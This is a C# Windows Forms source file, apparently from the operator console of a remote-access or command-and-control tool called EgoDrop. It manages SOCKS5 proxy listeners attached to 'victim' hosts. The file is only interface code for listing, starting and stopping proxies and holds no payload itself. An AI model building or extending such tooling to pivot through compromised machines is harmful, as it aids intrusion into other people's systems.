using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmProxy : Form
    {
        private frmMain m_frmMain { get; init; }
        private clsSqlite m_sqlite { get; init; }
        private clsVictim m_victim { get; init; }
        private string m_szVictimID { get; init; }
        private string m_szIPv4 { get; init; }

        public frmProxy(frmMain frmMain, clsSqlite sqlite, clsVictim victim, string szVictimID, string szIPv4)
        {
            InitializeComponent();

            m_frmMain = frmMain;
            m_sqlite = sqlite;
            m_victim = victim;
            m_szVictimID = szVictimID;
            m_szIPv4 = szIPv4;
        }

        public frmProxy(frmMain frmMain, clsSqlite sqlite)
        {
            InitializeComponent();

            m_frmMain = frmMain;
            m_sqlite = sqlite;

            m_victim = null;
            m_szVictimID = null;
            m_szIPv4 = null;
        }

        async void fnStart()
        {
            foreach (ListViewItem item in listView1.CheckedItems)
            {
                string szEpId = item.SubItems[1].Text;
                string szEpIp = item.SubItems[2].Text;

                if (string.IsNullOrEmpty(szEpId) || string.IsNullOrEmpty(szEpIp))
                {
                    MessageBox.Show("Endpoint data is null or empty!", "Proxy", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }

            foreach (ListViewItem item in listView1.CheckedItems)
            {
                string szName = item.Text;
                m_frmMain.m_dicLtnProxy[szName].fnStart();
            }

            fnLoadProxies();
        }

        async void fnStop()
        {
            foreach (ListViewItem item in listView1.CheckedItems)
            {
                string szName = item.Text;
                m_frmMain.m_dicLtnProxy[szName].fnStop();
            }

            fnLoadProxies();
        }

        void fnRestart()
        {
            fnStart();
            fnStop();
        }

        public void fnLoadProxies()
        {
            //Load proxy listener.
            listView1.Items.Clear();
            if (m_frmMain.m_dicLtnProxy.Count == 0)
            {
                var proxies = m_sqlite.fnlsGetProxies();
                foreach (var config in proxies)
                {
                    var ltn = new clsLtnSocks5(m_victim, m_szVictimID, config.szName, config.nPort, config.szDescription);
                    m_frmMain.m_dicLtnProxy.Add(config.szName, ltn);
                }
            }

            foreach (string szName in m_frmMain.m_dicLtnProxy.Keys)
            {
                var ltn = m_frmMain.m_dicLtnProxy[szName];

                ListViewItem item = new ListViewItem(szName);
                item.SubItems.Add(m_szVictimID);
                item.SubItems.Add(m_szIPv4);
                item.SubItems.Add(Enum.GetName(ltn.m_enProtocol));
                item.SubItems.Add(ltn.m_nPort.ToString());
                item.SubItems.Add(ltn.m_bIsRunning ? "Listening" : "Closed");
                item.SubItems.Add(ltn.m_szDescription);

                item.Checked = ltn.m_bIsRunning;

                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Proxies[{listView1.Items.Count}]";
        }

        void fnSetup()
        {
            fnLoadProxies();
        }

        private void frmSocks5Proxy_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Start
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnStart();
        }

        //Stop
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            fnStop();
        }

        //Add
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            frmProxyEdit f = new frmProxyEdit(this, m_sqlite, m_szVictimID);
            f.ShowDialog();
        }
    }
}
